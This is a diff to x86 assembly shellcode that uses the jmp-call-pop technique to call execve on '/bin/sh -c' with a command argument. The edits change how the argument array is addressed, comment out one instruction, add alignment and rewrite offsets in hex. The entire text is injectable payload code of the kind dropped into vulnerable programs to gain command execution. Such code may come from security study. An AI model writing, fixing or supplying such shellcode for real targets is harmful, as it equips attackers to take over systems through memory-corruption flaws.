@@ -25,6 +25,7 @@ Section   .text
 
 _start:
      jmp short arg3
+align 4
 shellcode:
      pop esi
      xor eax, eax
@@ -34,10 +35,10 @@ shellcode:
      mov long [esi + 12], eax
      mov byte al, 0x0b
      mov ebx, esi
-     lea ecx, [esi + 8]
+     ;lea ecx, [esi + 8]
+     lea ecx, [esp - 4]
      lea edx, [esi + 12]
      int 0x80
-
 arg3:
      xor eax, eax
      sub long esp, 0x4
@@ -48,12 +49,12 @@ arg2:
 arg1:
      pop esi
      push esi
-     mov byte [esi + 10], al
+     mov byte [esi + 0xa], al
      Call arg0
      db '-cJ'
 arg0:
      pop esi
      push esi
-     mov byte [esi + 2], al
+     mov byte [esi + 0x2], al
      Call shellcode
      db '/bin/shJAAAAKKKK'
